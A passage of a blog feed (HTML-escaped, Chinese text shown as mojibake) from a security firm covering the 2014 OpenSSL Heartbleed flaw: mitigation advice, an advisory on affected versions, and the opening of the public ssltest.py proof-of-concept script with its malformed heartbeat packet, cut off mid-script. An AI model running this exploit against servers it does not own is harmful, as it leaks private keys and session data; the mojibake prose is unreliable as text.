  &lt;li&gt;ÈáçÊñ∞Áî¢ÁîüÈáëÈë∞ÔºàPrivate Key ÂèØËÉΩÂ§ñÊ¥©Ôºâ„ÄÅSessionÔºàSession ID ÂèØËÉΩÂ§ñÊ¥©Ôºâ„ÄÅÂØÜÁ¢ºÔºàÂØÜÁ¢º‰πüÂèØËÉΩÂ§ñÊ¥©ÔºâÔºå‰∏¶‰∏îÊí§Èä∑ÂéüÊú¨ÁöÑÈáëÈë∞„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ëã•ÁÑ°Ê≥ïÊõ¥Êñ∞ÔºåÈáçÊñ∞Á∑®Ë≠Ø OpenSSL ‰ª•ÈóúÈñâ heartbeat ÂäüËÉΩ„ÄÇ&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî® &lt;a href=&quot;http://en.wikipedia.org/wiki/Forward_secrecy&quot;&gt;Perfect Forward Secrecy (PFS)&lt;/a&gt;ÔºåÂú®Êú™‰æÜÈ°û‰ººÈ¢®Èö™ÁôºÁîüÊôÇÊ∏õ‰ΩéÂÇ∑ÂÆ≥„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ë®±Â§öÊ•≠ËÄÖÊä±ÊåÅËëóÂÉ•ÂÄñÁöÑÂøÉÊÖãÔºåÊÉ≥Ë™™Â§ñÊ¥©ÁöÑÁõÆÊ®ô‰∏çÊúÉËº™Âà∞Ëá™Â∑±„ÄÇÂ¶ÇÊûúÂ§ßÂÆ∂ÁúãÂà∞ÈÄôÂπæÂ§©&lt;strong&gt;ÂÖ®‰∏ñÁïåË≥áÂÆâ‰∫∫Âì° / Èß≠ÂÆ¢‰∏çÁú†‰∏ç‰ºëÁöÑÊíàÂèñË≥áÊñô&lt;/strong&gt;ÔºåÊáâË©≤ÊúÉÂæπÂ∫ïÊ∂àÊªÖÂÉ•ÂÄñÁöÑÊÉ≥Ê≥ï‰πñ‰πñÂÅöÂ•ΩÈò≤Ë≠∑„ÄÇÂú®ÊºèÊ¥ûÊè≠Èú≤ÁöÑÈ†≠ÂπæÂ§©ÔºåÂ∞±Â∑≤Á∂ìÈô∏Á∫åÁúãÂà∞‰∏çÂ∞ëÈß≠ÂÆ¢ÈÄ≤ÂÖ• Google„ÄÅFacebook„ÄÅYahoo! Á≠â‰º∫ÊúçÂô®Ôºå‰∏¶‰∏îÊí∞ÂØ´Â§ßË¶èÊ®°ÊéÉÊèèÂ∑•ÂÖ∑Â§ßÈáèÊîªÊìä„ÄÇÈô§Èùû‰Ω†ÊúâÊääÊè°Ëá™Â∑±ÁöÑ‰º∫ÊúçÂô®Ê≤íÊúâ‰ªª‰ΩïÈÄ£Á∑öÔºå‰∏çÁÑ∂ÈÇÑÊòØË´ã‰πñ‰πñÊõ¥Êñ∞Âêß„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Â§ß‰∫ã‰ª∂Â§ßÂïüÁ§∫&quot;&gt;Â§ß‰∫ã‰ª∂ÔºåÂ§ßÂïüÁ§∫&lt;/h3&gt;

&lt;p&gt;ÈÇÑË®òÂæó‰πãÂâçÊàëÂÄëÊèêÂà∞ÁöÑ„Äå&lt;a href=&quot;http://devco.re/blog/2014/03/14/3rd-party-software-security-issues/&quot;&gt;‰ΩøÁî®Á¨¨‰∏âÊñπÂ•ó‰ª∂ÊâÄË¶ÅÊìîË≤†ÁöÑË≥áÂÆâÈ¢®Èö™&lt;/a&gt;„ÄçÔºüÈÄôÊ¨°ÁöÑ‰∫ã‰ª∂Â∞±ÊòØ‰∏ÄÂÄãË°ÄÊ∑ãÊ∑ãÁöÑÊ°à‰æã„ÄÇ‰∏çÁÆ°ÊòØÂª†ÂïÜ„ÄÅÁ§æÁæ§„ÄÅÂÄã‰∫∫ÈñãÁôºËÄÖÁöÑÁ≤óÂøÉÂ§±Ë™§ÔºåÊàñËÄÖÊòØÂúãÂÆ∂Ê©üÂô® NSA ÁöÑÂº∑ÂäõÊª≤ÈÄèÔºå‰ΩøÁî®ÂêÑÁ®ÆÁ¨¨‰∏âÊñπÁöÑÂ•ó‰ª∂ÈÉΩÈúÄË¶ÅÊâøÊìîÊ•µÂ§ßÁöÑÈ¢®Èö™„ÄÇ‰ΩÜÂèØÊÇ≤ÁöÑÊòØÔºåÊàëÂÄëÂçªÁÑ°Ê≥ï‰∏ç‰ΩøÁî®„ÄÇÂæûÈÄôÊ¨°ÁöÑ‰∫ã‰ª∂ÊàëÂÄëÂèØ‰ª•Â≠∏Âà∞Âπæ‰ª∂‰∫ãÊÉÖÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;‰∏çÁÆ°Âì™Á®ÆÊîªÊìäÊâãÊ≥ï„ÄÅÂ§öËÄÅËàäÁöÑÊîªÊìäÊâãÊ≥ïÔºåÂú®Êú™‰æÜÈÉΩÂèØËÉΩÊúÉÂÜçÂ∫¶ÁôºÁîü„ÄÇ&lt;/li&gt;
  &lt;li&gt;Á®ãÂºèÁ¢ºÁöÑ review ÈùûÂ∏∏ÈáçË¶ÅÔºå‰∏ÄÂÆöË¶ÅÂú®ÈñãÁôºÈÅéÁ®ã‰∏≠Â∞éÂÖ•Á®ãÂºèÁ¢º review Ê©üÂà∂Ôºå‰ª•ÂÖçÈñãÁôºËÄÖÂØ´Âá∫Âê´ÊúâÂÆâÂÖ®ÁñëÊÖÆÁöÑÁ®ãÂºèÁ¢º„ÄÇ&lt;/li&gt;
  &lt;li&gt;Âä†ÂØÜ„ÄÅSession ÊéßÁÆ°„ÄÅÈáëÈë∞ÊéßÁÆ°Á≠âË≠∞È°åÔºåÊòØÊ∞∏ÈÅ†ÁöÑË™≤È°å„ÄÇ‰∏ÄÂ§©Ê≤íËôïÁêÜÂ•ΩÔºåÂú®Êú™‰æÜÁöÑÈ¢®Èö™‰∏≠ÊúÉÂÜçÂ∫¶ÂèóÂÆ≥„ÄÇ&lt;/li&gt;
  &lt;li&gt;È¢®Èö™Ê∞∏ÈÅ†ÊúÉÁôºÁîüÂú®‰Ω†Áåú‰∏çÂà∞ÁöÑÂú∞ÊñπÔºåÂèØËÉΩÊòØÁ®ãÂºè„ÄÅÂèØËÉΩÊòØÂáΩÂºèÂ∫´„ÄÅ&lt;a href=&quot;http://technews.tw/2013/09/06/most-common-encryption-protocols-are-useless-against-nsa-surveillance/&quot;&gt;ÂèØËÉΩÊòØÂä†ÂØÜÂçîÂÆö&lt;/a&gt;„ÄÅÊõ¥ÂèØËÉΩÊòØ&lt;a href=&quot;http://ckhung0.blogspot.tw/2014/03/dual-ec-drbg.html&quot;&gt;‰∫ÇÊï∏Áî¢ÁîüÂô®&lt;/a&gt;„ÄÇ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;‰∏çÊñ∑ÁöÑÂ¢ûÂº∑Ë≥áÂÆâÊÑèË≠ò„ÄÅ‰∏çÂÅúÁöÑÂàÜ‰∫´Êñ∞Áü•„ÄÅÂª†ÂïÜÂÅöÂ•ΩË≥áÂÆâÊéßÁÆ°Âèä&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;ÂÆâÂÖ®Ê™¢Ê∏¨&lt;/a&gt;„ÄÅÊ∞ëÁúæÂ∞ç‰ºÅÊ•≠ÂíåÊîøÂ∫úË¶ÅÊ±ÇË≥áË®äÂÆâÂÖ®ÔºåÈõÜÂêàÂ§ßÂÆ∂ÁöÑÂäõÈáèÔºåÊòØÊîπÂñÑË≥áÂÆâÂ§ßÁí∞Â¢ÉÁöÑ‰∏ç‰∫åÊ≥ïÈñÄ„ÄÇ&lt;/p&gt;

&lt;p&gt;‰Ω†‰ª•ÁÇ∫Ëá™Â∑±ÈÄÉÈÅé‰∏ÄÂä´‰∫ÜÂóéÔºü‰πüË®±‰Ω†ÁöÑË∫´È´îÂ∑≤Á∂ìË°ÄÊµÅÂ¶ÇÊü±ÔºåËÄåÂóúË°ÄÁöÑÈØäÈ≠öÊ≠£Ê∏∏Âêë‰Ω†„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/</link>
                <guid>https://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect</guid>
                <pubDate>Fri, 11 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL CVE-2014-0160 Heartbleed Âö¥ÈáçÊºèÊ¥û </title>
                <description>&lt;h3 id=&quot;openssl-cve-2014-0160-Âö¥ÈáçÊºèÊ¥û&quot;&gt;OpenSSL CVE-2014-0160 Âö¥ÈáçÊºèÊ¥û&lt;/h3&gt;

&lt;p&gt;OpenSSL ‰ªäÂ§©ÂÖ¨Âëä‰∫Ü‰∏ÄÂÄãÊ•µÂ∫¶Âö¥ÈáçÁöÑÊºèÊ¥ûÔºà&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160&quot;&gt;CVE-2014-0160&lt;/a&gt;ÔºâÔºåË¢´Á®±ÁÇ∫„Äå&lt;a href=&quot;http://heartbleed.com/&quot;&gt;Heartbleed&lt;/a&gt;„ÄçÔºåËÄå‰ªñÁ¢∫ÂØ¶‰πüÂ¶ÇÂêåÂøÉËáüÂô¥Âá∫Ë°ÄËà¨Âö¥Èáç„ÄÇÈÄôÂÄãÊºèÊ¥ûËÉΩËÆìÊîªÊìäËÄÖÂæû‰º∫ÊúçÂô®Ë®òÊÜ∂È´î‰∏≠ËÆÄÂèñ 64 KB ÁöÑË≥áÊñôÔºåÂà©Áî®ÂÇ≥ÈÄÅ heartbeat ÁöÑÂ∞ÅÂåÖÁµ¶‰º∫ÊúçÂô®ÔºåÂú®Â∞ÅÂåÖ‰∏≠ÊéßÂà∂ËÆäÊï∏Â∞éËá¥ memcpy ÂáΩÊï∏Ë§áË£ΩÈåØË™§ÁöÑË®òÊÜ∂È´îË≥áÊñôÔºåÂõ†ËÄåÊì∑ÂèñË®òÊÜ∂È´î‰∏≠ÂèØËÉΩÂ≠òÂú®ÁöÑÊ©üÊïèË≥áÊñô„ÄÇË®òÊÜ∂È´î‰∏≠ÊúÄÂö¥ÈáçÂèØËÉΩÂåÖÂê´ ssl private key„ÄÅsession cookie„ÄÅ‰ΩøÁî®ËÄÖÂØÜÁ¢ºÁ≠âÔºåÂõ†Ê≠§ÂèØËÉΩÂõ†ÁÇ∫ÈÄôÊ®£ÁöÑÊºèÊ¥ûÂ∞éËá¥‰º∫ÊúçÂô®ÈÅ≠Âà∞ÂÖ•‰æµÊàñÂèñÂæó‰ΩøÁî®ËÄÖÂ∏≥Ëôü„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Ë©≥Á¥∞ÁöÑÂàÜÊûêÂèØ‰ª•ÂèÉÈñ± &lt;a href=&quot;http://blog.existentialize.com/diagnosis-of-the-openssl-heartbleed-bug.html&quot;&gt;existential type crisis : Diagnosis of the OpenSSL Heartbleed Bug&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ËªüÈ´îÂêçÁ®±ÔºöOpenSSL&lt;/li&gt;
  &lt;li&gt;ÂΩ±ÈüøÁØÑÂúçÔºö1.0.1 Ëá≥ 1.0.1f / 1.0.2-beta ~ 1.0.2-beta1&lt;/li&gt;
  &lt;li&gt;‰øÆÂæ©ÁâàÊú¨Ôºö1.0.1g / 1.0.2-beta2&lt;/li&gt;
  &lt;li&gt;ÂΩ±ÈüøÁ≥ªÁµ±ÁâàÊú¨
    &lt;ul&gt;
      &lt;li&gt;Debian Wheezy (stable), OpenSSL 1.0.1e-2+deb7u4&lt;/li&gt;
      &lt;li&gt;Ubuntu 12.04.4 LTS, OpenSSL 1.0.1-4ubuntu5.11&lt;/li&gt;
      &lt;li&gt;CentOS 6.5, OpenSSL 1.0.1e-15&lt;/li&gt;
      &lt;li&gt;Fedora 18, OpenSSL 1.0.1e-4&lt;/li&gt;
      &lt;li&gt;OpenBSD 5.3 (OpenSSL 1.0.1c 10 May 2012) and 5.4 (OpenSSL 1.0.1c 10 May 2012)&lt;/li&gt;
      &lt;li&gt;FreeBSD 10.0 - OpenSSL 1.0.1e 11 Feb 2013&lt;/li&gt;
      &lt;li&gt;NetBSD 5.0.2 (OpenSSL 1.0.1e)&lt;/li&gt;
      &lt;li&gt;OpenSUSE 12.2 (OpenSSL 1.0.1c)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂΩ±ÈüøÊúçÂãôÔºöHTTP„ÄÅSMTPS„ÄÅIMAPS„ÄÅPOP3S Á≠â‰ΩøÁî® OpenSSL ‰πãÊúçÂãô&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;OpenSSL ÁöÑÂÖ¨ÂëäÂ¶Ç‰∏ãÔºö&lt;a href=&quot;https://www.openssl.org/news/secadv_20140407.txt&quot;&gt;https://www.openssl.org/news/secadv_20140407.txt&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;
A missing bounds check in the handling of the TLS heartbeat extension can be
used to reveal up to 64k of memory to a connected client or server.

Only 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including
1.0.1f and 1.0.2-beta1.
&lt;/pre&gt;

&lt;h3 id=&quot;Â¶Ç‰ΩïËá™ÊàëÊ™¢Ê∏¨&quot;&gt;Â¶Ç‰ΩïËá™ÊàëÊ™¢Ê∏¨Ôºü&lt;/h3&gt;

&lt;p&gt;Ë¶ÅÂ¶Ç‰ΩïÊ∏¨Ë©¶Ëá™Â∑±ÁöÑÁ∂≤Á´ôÊúâÊ≤íÊúâÈÄôÊ®£ÁöÑÊºèÊ¥ûÂë¢ÔºüÂèØ‰ª•Âà©Áî®‰ª•‰∏ãÁöÑÁ∂≤Á´ôÊàñÂ∑•ÂÖ∑Áõ¥Êé•Êü•Ë©¢„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Heartbleed test &lt;a href=&quot;http://filippo.io/Heartbleed/&quot;&gt;http://filippo.io/Heartbleed/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Áõ¥Êé•Ëº∏ÂÖ• Domain Âç≥ÂèØÊü•Ë©¢Ôºå‰æãÂ¶Ç„Äåfbi.gov„Äç„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed Ê™¢Ê∏¨: fbi.gov&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed Ê™¢Ê∏¨: fbi.gov&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Ëá™ÊàëÊ∏¨Ë©¶Â∑•ÂÖ∑ &lt;a href=&quot;http://s3.jspenguin.org/ssltest.py&quot;&gt;http://s3.jspenguin.org/ssltest.py&lt;/a&gt; ÔºàÊàñ &lt;a href=&quot;http://pastebin.com/WmxzjkXJ&quot;&gt;http://pastebin.com/WmxzjkXJ&lt;/a&gt;Ôºâ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‰ΩøÁî®ÊñπÊ≥ïÁõ¥Êé•Âü∑Ë°å„Äåpython ssltest.py ifttt.com„ÄçÔºåÊàñÊòØÁî®„Äå-p„ÄçÊåáÂÆöÁâπÂÆö SSL ÈÄ£Êé•Âü†„ÄÇÁï´Èù¢‰∏äÊúÉÈ°ØÁ§∫Âá∫Ë®òÊÜ∂È´îË≥áÊñôÔºåÂèØËÉΩÂÖßÂê´Ê©üÊïèË≥áÊñô‰æãÂ¶Ç private key„ÄÅsession cookie Á≠â„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed Ê™¢Ê∏¨: ifttt.com&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed Ê™¢Ê∏¨: ifttt.com&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÂéüÂßãÁ¢ºÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;select&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;optparse&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;%prog server [options]&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Test for SSL heartbeat vulnerability (CVE-2014-0160)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;-p&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;--port&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;int&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;TCP port to test (default: 443)&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos;
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos; 
18 03 02 00 03
01 40 00
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hxdat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;%02X&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pdat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;.&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;  %04x: %-48s %s&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hxdat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;

